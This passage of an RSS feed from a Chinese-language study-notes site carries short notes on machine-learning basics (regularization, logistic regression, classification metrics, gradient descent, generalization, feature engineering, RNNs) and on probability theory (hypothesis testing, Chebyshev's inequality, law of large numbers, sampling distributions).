一个是损失项，用于衡量模型与数据的拟合度； 另一个是正则化项，用于衡量模型复杂度。 机器学习速成课程重点介绍了两种衡量模型复杂度的常见方式（这两种方式有些相关）：
将模型复杂度作为模型中所有特征的权重的函数。 将模型复杂度作为具有非零权重的特征总数的函数。（后面的一个单元介绍了这种方法。） 如果模型复杂度是权重的函数，则特征权重的绝对值越高，对模型复杂度的贡献就越大。
L2 正则化 # 我们可以使用 L2 正则化 公式来量化复杂度，该公式将正则化项定义为所有特征权重的平方和：
$$L_2\ regularization\ term=||w||^2_2=w_1^2+w_2^2+&amp;hellip;+w_n^2$$
在这个公式中，接近于 0 的权重对模型复杂度几乎没有影响，而离群值权重则可能会产生巨大的影响。
简化正则化 lambda # 模型开发者通过以下方式来调整正则化项的整体影响：用正则化项的值乘以名为 lambda（又称为正则化率）的标量。也就是说，模型开发者会执行以下运算：
$$minimize(Loss(Data[Model]) + \lambda complexity(Model))$$
在选择 lambda 值时，目标是在简单化和训练数据拟合之间达到适当的平衡：
如果您的 lambda 值过高，则模型会非常简单，但是您将面临数据欠拟合的风险。您的模型将无法从训练数据中获得足够的信息来做出有用的预测。 如果您的 lambda 值过低，则模型会比较复杂，并且您将面临数据过拟合的风险。您的模型将因获得过多训练数据特点方面的信息而无法泛化到新数据。 注意：将 lambda 设为 0 可彻底取消正则化。 在这种情况下，训练的唯一目的将是最小化损失，而这样做会使过拟合的风险达到最高。
理想的 lambda 值生成的模型可以很好地泛化到以前未见过的新数据。 遗憾的是，理想的 lambda 值取决于数据，因此您需要手动或自动进行一些调整。
关键词 # 泛化曲线、L2 正则化、过拟合、正则化、结构风险最小化、早停法、lambda、正则化率</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/11.logisticregression/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/11.logisticregression/</guid><description>逻辑回归 # 计算概率 # 许多问题需要将概率估算值作为输出。逻辑回归是一种极其高效的概率计算机制。
S 型函数：
一个值域恰好在 0 到 1 之间的函数，定义为：$$\displaystyle y = \frac{1}{1 + e^{-z}}$$ z 表示使用逻辑回归训练的模型的线性层的输出。
损失函数 # 线性回归的损失函数是平方损失。逻辑回归的损失函数是对数损失函数，定义如下：
$$\displaystyle Log Loss = \sum_{(x,y)\in D} -ylog(y&amp;rsquo;) - (1 - y)log(1 - y&amp;rsquo;)​$$
其中：
$$(x, y) \in D$$ 是包含很多有标签样本 (x,y) 的数据集。 “y”是有标签样本中的标签。由于这是逻辑回归，因此 “y” 的每个值必须是 0 或 1。 “y&amp;rsquo;”是对于特征集“x”的预测值（介于 0 和 1 之间）。 正则化 # 正则化在逻辑回归建模中极其重要。如果没有正则化，逻辑回归的渐近性会不断促使损失在高维度空间内达到 0。因此，大多数逻辑回归模型会使用以下两个策略之一来降低模型复杂性：
L2 正则化。 早停法，即，限制训练步数或学习速率。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/12.classification/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/12.classification/</guid><description>分类 # 阈值 # 为了将逻辑回归值映射到二元类别，您必须指定分类阈值（也称为判定阈值）。
准确率 # 我们假设：
$$H_0$$ 成立 $$H_1$$ 成立 接收 不犯错（TP） 第 II 类错误（取伪错误 FP） 拒绝 第 I 类错误（弃真错误 FN） 不犯错（TN） 准确率是指我们的模型预测正确的结果所占的比例：
$$\displaystyle \text{Accuracy} = \frac{\text{Number of correct predictions}}{\text{Total number of predictions}}$$ 对于二元分类，也可以根据正类别和负类别按如下方式计算准确率：
$$\displaystyle \text{Accuracy} = \frac{TP+TN}{TP+TN+FP+FN}$$ 当您使用分类不平衡的数据集（比如正类别标签和负类别标签的数量之间存在明显差异）时，单单准确率一项并不能反映全面情况。
精确率和召回率 # 精确率的定义如下：$$\displaystyle \text{Precision} = \frac{TP}{TP+FP}$$
从数学上讲，召回率的定义如下：$$\displaystyle \text{召回率} = \frac{TP}{TP+FN}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/2.descending/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/2.descending/</guid><description>深入了解机器学习 # 线性回归是一种找到最适合一组点的直线或超平面的方法。本模块会先直观介绍线性回归，为介绍线性回归的机器学习方法奠定基础。
线性回归 # 关键字词
偏差、 推断、线性回归、权重
训练与损失 # 概念 # 训练：
训练模型表示通过有标签样本来学习（确定）所有权重和偏差的理想值。
在监督式学习中，机器学习算法通过以下方式构建模型：
检查多个样本并尝试找出可最大限度地减少损失的模型；这一过程称为经验风险最小化。 损失：
损失是对糟糕预测的惩罚。也就是说，损失是一个数值，表示对于单个样本而言模型预测的准确程度。 如果模型的预测完全准确，则损失为零，否则损失会较大。训练模型的目标是从所有样本中找到一组平均损失“较小”的权重和偏差。 损失函数 # 平方损失：是一种常见的损失函数
接下来我们要看的线性回归模型使用的是一种称为平方损失（又称为 L2 损失）的损失函数。单个样本的平方损失如下：
= the square of the difference between the label and the prediction
= (observation - prediction(x))2
= (y - y&amp;#39;)2 均方误差 (MSE) 指的是每个样本的平均平方损失。要计算 MSE，请求出各个样本的所有平方损失之和，然后除以样本数量：
$$\displaystyle MSE = \frac{1}{N} \sum_{(x,y) \in D} (y - prediction(x))^2$$，其中：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/3.reduceloss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/3.reduceloss/</guid><description>降低损失 # 迭代方法 # 下图显示了机器学习算法用于训练模型的迭代试错过程：
模型部分将一个或多个特征作为输入，然后返回一个预测 (y&amp;rsquo;) 作为输出。
计算损失部分是模型将要使用的损失函数。
计算参数更新部分：机器学习系统就是在此部分检查损失函数的值，并生成新参数值。机器学习系统将根据所有标签重新评估所有特征，为损失函数生成一个新值，而该值又产生新的参数值。
通常，可以不断迭代，直到总体损失不再变化或至少变化极其缓慢为止。这时候，我们可以说该模型已收敛。
关键字词：
收敛、损失、训练
梯度下降法 # 学习速率 # 梯度下降法算法用梯度乘以一个称为学习速率（有时也称为步长）的标量，以确定下一个点的位置。
如果您选择的学习速率过小，就会花费太长的学习时间； 相反，如果您指定的学习速率过大，下一个点将永远在 U 形曲线的底部随意弹跳； 每个回归问题都存在一个金发姑娘学习速率。“金发姑娘”值与损失函数的平坦程度相关。如果您知道损失函数的梯度较小，则可以放心地试着采用更大的学习速率，以补偿较小的梯度并获得更大的步长。 关键字词：
超参数、学习速率、步长
随机梯度下降 # 在梯度下降法中，批量指的是用于在单次迭代中计算梯度的样本总数。到目前为止，我们一直假定批量是指整个数据集。就 Google 的规模而言，数据集通常包含数十亿甚至数千亿个样本。此外，Google 数据集通常包含海量特征。因此，一个批量可能相当巨大。如果是超大批量，则单次迭代就可能要花费很长时间进行计算。
包含随机抽样样本的大型数据集可能包含冗余数据。实际上，批量大小越大，出现冗余的可能性就越高。一些冗余可能有助于消除杂乱的梯度，但超大批量所具备的预测价值往往并不比大型批量高。
如果我们可以通过更少的计算量得出正确的平均梯度，会怎么样？通过从我们的数据集中随机选择样本，我们可以通过小得多的数据集估算（尽管过程非常杂乱）出较大的平均值。 随机梯度下降法(SGD) 将这种想法运用到极致，它每次迭代只使用一个样本（批量大小为 1）。如果进行足够的迭代，SGD 也可以发挥作用，但过程会非常杂乱。“随机”这一术语表示构成各个批量的一个样本都是随机选择的。
小批量随机梯度下降法（小批量 SGD）是介于全批量迭代与 SGD 之间的折衷方案。小批量通常包含 10-1000 个随机选择的样本。小批量 SGD 可以减少 SGD 中的杂乱样本数量，但仍然比全批量更高效。
为了简化说明，我们只针对单个特征重点介绍了梯度下降法。请放心，梯度下降法也适用于包含多个特征的特征集。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/4.tensorflowapi/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/4.tensorflowapi/</guid><description>TensoFlow API # tf.estimator API # import tensorflow as tf # set up a linear classifier classifier = tf.estimator.LinearClassifier() # train the model on some example data classfier.train(input=train_input_fn, steps=2000) # use it to predict predictions = classifier.predict(input_fn = predict_input_fn)</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/5.generalization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/5.generalization/</guid><description>泛化 # 过拟合 # 下图所示的模型过拟合了训练数据的特性。过拟合模型在训练过程中产生的损失很低，但在预测新数据方面的表现却非常糟糕。如果某个模型在拟合当前样本方面表现良好，那么我们如何相信该模型会对新数据做出良好的预测呢？正如您稍后将看到的，过拟合是由于模型的复杂程度超出所需程度而造成的。机器学习的基本冲突是适当拟合我们的数据，但也要尽可能简单地拟合数据。
机器学习的目标是对从真实概率分布（已隐藏）中抽取的新数据做出良好预测。遗憾的是，模型无法查看整体情况；模型只能从训练数据集中取样。如果某个模型在拟合当前样本方面表现良好，那么您如何相信该模型也会对从未见过的样本做出良好预测呢？
奥卡姆的威廉是 14 世纪一位崇尚简单的修士和哲学家。他认为科学家应该优先采用更简单（而非更复杂）的公式或理论。奥卡姆剃刀定律在机器学习方面的运用如下：
机器学习模型越简单，良好的实证结果就越有可能不仅仅基于样本的特性。
现今，我们已将奥卡姆剃刀定律正式应用于统计学习理论和计算学习理论领域。这些领域已经形成了泛化边界，即统计化描述模型根据以下因素泛化到新数据的能力：
模型的复杂程度 模型在处理训练数据方面的表现 虽然理论分析在理想化假设下可提供正式保证，但在实践中却很难应用。机器学习速成课程则侧重于实证评估，以评判模型泛化到新数据的能力。
机器学习模型旨在根据以前未见过的新数据做出良好预测。但是，如果您要根据数据集构建模型，如何获得以前未见过的数据呢？一种方法是将您的数据集分成两个子集：
训练集 - 用于训练模型的子集。 测试集 - 用于测试模型的子集。 一般来说，在测试集上表现是否良好是衡量能否在新数据上表现良好的有用指标，前提是：
测试集足够大。 您不会反复使用相同的测试集来作假。 机器学习细则 # 以下三项基本假设阐明了泛化：
我们从分布中随机抽取独立同分布 (i.i.d) 的样本。换言之，样本之间不会互相影响。（另一种解释：i.i.d. 是表示变量随机性的一种方式）。 分布是平稳的；即分布在数据集内不会发生变化。 我们从同一分布的数据划分中抽取样本。 在实践中，我们有时会违背这些假设。例如：
想象有一个选择要展示的广告的模型。如果该模型在某种程度上根据用户以前看过的广告选择广告，则会违背 i.i.d. 假设。 想象有一个包含一年零售信息的数据集。用户的购买行为会出现季节性变化，这会违反平稳性。 如果违背了上述三项基本假设中的任何一项，那么我们就必须密切注意指标。
关键字词 # 泛化、过拟合、预测、 平稳性、测试集、训练集</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/6.trainingandtest/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/6.trainingandtest/</guid><description>测试集和数据集 # 上一单元介绍了将数据集分为两个子集的概念：
训练集 - 用于训练模型的子集。 测试集 - 用于测试训练后模型的子集。 您可以想象按如下方式拆分单个数据集：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/7.validation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/7.validation/</guid><description>验证集 # 上一单元介绍了如何将数据集划分为训练集和测试集。借助这种划分，您可以对一个样本集进行训练，然后使用不同的样本集测试模型。采用两种分类之后，工作流程可能如下所示：
将数据集划分为两个子集是个不错的想法，但不是万能良方。通过将数据集划分为三个子集（如下图所示），您可以大幅降低过拟合的发生几率：
使用验证集评估训练集的效果。然后，在模型“通过”验证集之后，使用测试集再次检查评估结果。下图展示了这一新工作流程：
在这一经过改进的工作流程中：
选择在验证集上获得最佳效果的模型。 使用测试集再次检查该模型。 该工作流程之所以更好，原因在于它暴露给测试集的信息更少。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/8.representation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/8.representation/</guid><description>特征工程 # 将原始数据映射到特征 # 下图左侧表示来自输入数据源的原始数据，右侧表示特征矢量，也就是组成数据集中样本的浮点值集。 特征工程指的是将原始数据转换为特征矢量。进行特征工程预计需要大量时间。
许多机器学习模型都必须将特征表示为实数向量，因为特征值必须与模型权重相乘。
数据表示 # 映射数值：
整数和浮点数据不需要特殊编码，因为它们可以与数字权重相乘。 映射分类值：
分类特征具有一组离散的可能值。
由于模型不能将字符串与学习到的权重相乘，因此我们使用特征工程将字符串转换为数字值：
要实现这一点，我们可以定义一个从特征值（我们将其称为可能值的词汇表）到整数的映射。世界上的每条街道并非都会出现在我们的数据集中，因此我们可以将所有其他街道分组为一个全部包罗的“其他”类别，称为 OOV（词汇表外）分桶。
这种编码存在不能设置权重、不能同时表示多个等限制。
要去除这些限制，我们可以为模型中的每个分类特征创建一个二元向量来表示这些值，如下所述：
对于适用于样本的值，将相应向量元素设为 1。 将所有其他元素设为 0。 该向量的长度等于词汇表中的元素数。当只有一个值为 1 时，这种表示法称为独热编码；当有多个值为 1 时，这种表示法称为多热编码。例子如下图：
稀疏表示法 # 假设数据集中有 100 万个不同的街道名称，您希望将其包含为 street_name 的值。如果直接创建一个包含 100 万个元素的二元向量，其中只有 1 或 2 个元素为 ture，则是一种非常低效的表示法，在处理这些向量时会占用大量的存储空间并耗费很长的计算时间。在这种情况下，一种常用的方法是使用稀疏表示法，其中仅存储非零值。在稀疏表示法中，仍然为每个特征值学习独立的模型权重，如上所述。
关键词 # 离散特征、特征工程、独热编码、表示
良好的特征工程 # 1. 避免很少使用的离散特征值： # 良好的特征值应该在数据集中出现大约 5 次以上。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/9.featurecrosses/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/9.featurecrosses/</guid><description>特征组合 # 对非线性规律进行组合 # 特征组合是指通过将两个或多个输入特征相乘来对特征空间中的非线性规律进行编码的合成特征。“cross”（组合）这一术语来自 cross product（向量积）。
我们通过将 $$x_1$$ 与 $$x_2$$ 组合来创建一个名为 $$x_3$$ 的特征组合：$$x_3 = x_1 x_2$$
我们像处理其他特征一样来处理这个新建的 $$x_3$$ 特征组合。线性公式变为：$$y = b + w_1x_1 + w_2x_2 + w_3x_3$$
线性算法可以算出 $$w_3$$ 的权重，就像算出 $$w_1$$ 和 $$w_2$$ 的权重一样。换言之，虽然 $$w_3$$ 表示非线性信息，但您不需要改变线性模型的训练方式来确定 $$w_3$$ 的值。
我们可以创建很多不同种类的特征组合。例如：
[A X B]：将两个特征的值相乘形成的特征组合； [A X B X C X D X E]：将五个特征值相乘形成的特征组合； [A X A]：对单个特征的值求平方形成的特征组合。 关键字词：特征组合、合成特征
组合独热矢量 # 笛卡儿积</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/rnn/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/rnn/</guid><description>学习地址：
https://www.youtube.com/watch?v=lWkFhVq9-nc introduction to RNN # Feed Forward Neural Network, FFNN # In a Feed-Forward Network, information flow only in forward direction.
graph LR;
I{input}; IL(Input Layer); HL(Hidden Layer); OL(Output Layer); O{Predicted output}
I--&amp;gt;IL; IL--&amp;gt;HL; HL--&amp;gt;OL; OL--&amp;gt;O; Decisions are based on current input. No memory about the past. No future scope. Question:
cannot handle sequential data. considers only the current input. cannot memorize previous inputs.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/</guid><description>假设检验 # 概念 # 原假设和备选假设 # 原假设（null hypothesis）：$$H_0$$
原来就有的假设 经过长期证明是对的 对立假设 /备择假设（alternative hypothesis）：$$ H_1 $$
参数的假设一般具有如下三种形式：
原假设 $$H_0$$ 备选假设 $$H_1$$ 记作 分类 $$\theta = \theta_0$$ $$\theta \ne \theta_0$$ $$H_0(I)$$ 双侧检验 $$\theta \ge \theta_0$$ $$\theta \lt \theta_0$$ $$H_0(II)$$ 单侧检验 $$\theta \le \theta_0$$ $$\theta \gt \theta_0$$ $$H_0(III)$$ 单侧检验 假设检验：就是通过样本来回答原假设是正确还是错误。
检验统计量 # 检验统计量的取值范围和变化情况，能包含和反映 $$ H_0 $$ 与$$ H_1 $$ 所描述的内容，并且当 $$ H_0 $$ 成立时，能够确定检验统计量的概率分布。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%88%87%E6%AF%94%E9%9B%AA%E5%A4%AB%E4%B8%8D%E7%AD%89%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%88%87%E6%AF%94%E9%9B%AA%E5%A4%AB%E4%B8%8D%E7%AD%89%E5%BC%8F/</guid><description>知乎：https://www.zhihu.com/question/27821324
马尔科夫不等式：
$${\displaystyle P(X \ge a) \le \frac{E(X)}{a}, where\ X \ge a}$$ 切比雪夫不等式：
$${\displaystyle P(|X-\mu| \ge k\sigma) \le \frac{1}{k^2}}$$ 前者带入 $$X \Rightarrow |X-\mu|$$ ，平方，令 $${\displaystyle k = \frac{a}{\sigma}}$$ 得到后者。
切比雪夫不等式预测的准确率要远远高于马尔科夫不等式。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%A4%A7%E6%95%B0%E5%AE%9A%E7%90%86%E5%92%8C%E4%B8%AD%E5%BF%83%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%A4%A7%E6%95%B0%E5%AE%9A%E7%90%86%E5%92%8C%E4%B8%AD%E5%BF%83%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/</guid><description>大数定理 # 依概率收敛 # 定义 # 如果对于任何 $$\epsilon &amp;gt; 0$$，都有：
$${\displaystyle \lim_{n \to \infin} P(|\xi_n - \xi| \geq \epsilon) = 0}$$
那么我们称随机变量序列 $${\displaystyle{ \xi_n, n \in \mathbb{N}}}$$ 依概率收敛到随机变量 $$\xi$$，记作 $${\displaystyle \xi_n \xrightarrow{p} \xi}$$
性质 # 设 $$X_n \xrightarrow{P} a, Y_n \xrightarrow{P} b $$，且函数 $$g(x,y)$$ 在点 $$(a, b)$$ 连续，则称：$$g(X_n, Y_n) \xrightarrow{P} g(a,b)$$
依概率收敛比高等数学中的普通意义下的收敛弱些，它具有某种不确定性：
当 n 充分大时，事件 $$|X_n - a| \lt \epsilon$$ 的概率非常大，接近于 1，但是并不排除 $$|X_n - a| \ge \epsilon$$ 发生的可能性。 一、切比雪夫 Chebyshev 大数定理 # 设 $$X_1, X_2, &amp;hellip;, X_n, &amp;hellip;$$ 相互独立，且具有相同的数学期望和方差：$$E(X_k) = \mu, D(X_k) = \sigma^2, k = 1,2&amp;hellip;$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%A0%B7%E6%9C%AC%E5%8F%8A%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%A0%B7%E6%9C%AC%E5%8F%8A%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/</guid><description>样本及抽样分布 # 总体与样本 # 样本：n 个与总体同分布的随机变量。
简单随机样本：
代表性：样本中的每一个与所考查的总体有相同的分布； 独立性：样本中的每一个都是相互独立的随机变量。 统计量 # 定义：
设 $$X_1, X_2, &amp;hellip;, X_n$$ 是来自总体 X 的一个样本，$$g(X_1, X_2, &amp;hellip;, X_n)$$ 是 $$X_1, X_2, &amp;hellip;, X_n$$ 的函数，若 g 中不含任何参数，则 $$g(X_1, X_2, &amp;hellip;, X_n)$$ 称是一个统计量。 几个重要的统计量：
样本均值：$${\displaystyle \overline{X} = \frac{1}{n}\sum_{i=1}^n X_i }$$ 样本方差：$${\displaystyle S^2 = \frac{1}{n-1}\sum_{i=1}^n (X_i - \overline{X})^2 = \frac{1}{n-1}\Big(\sum_{i=1}^nX_i^2 - n \overline{X}^2\Big)} $$ $${\displaystyle E(S^2) = \frac{1}{n-1}\Big[\sum_{i=1}^n(\sigma^2 + \mu^2) - n(\frac{\sigma^2}{n} + \mu^2)\Big] = \sigma^2 }$$ 样本 k 阶原点矩：$${\displaystyle A_k = \frac{1}{n}\sum_{i=1}^n X_i^k }$$ 样本 k 阶中心矩：$${\displaystyle B_k = \frac{1}{n}\sum_{i=1}^n (X_i - \overline{X})^k }$$ 经验分布函数 # 设 $$X_1, X_2, &amp;hellip;, X_n$$ 是总体 $$F$$ 的样本，用 $$s(x), |x| &amp;lt; \infty$$ 表示 $$X_1, X_2, &amp;hellip;, X_n$$ 中不大于 $$x$$ 的随机变量的个数。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E5%88%86%E5%B8%83/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E5%88%86%E5%B8%83/</guid><description>常见概率分布总结：
分布名称 记号 分布律或概率密度函数 数学期望 方差 两点分布 $$X \sim (0-1)$$ $$P(X = x) = p^{k}q^{1-k}$$
$$x \in {0,1}, 0 \lt p \lt 1, q = 1-p$$ $$p$$ $$pq$$ 二项分布 $$X \sim B(n, p)$$ $$P(X = k) = C_n^kp^kq^{n-k}$$
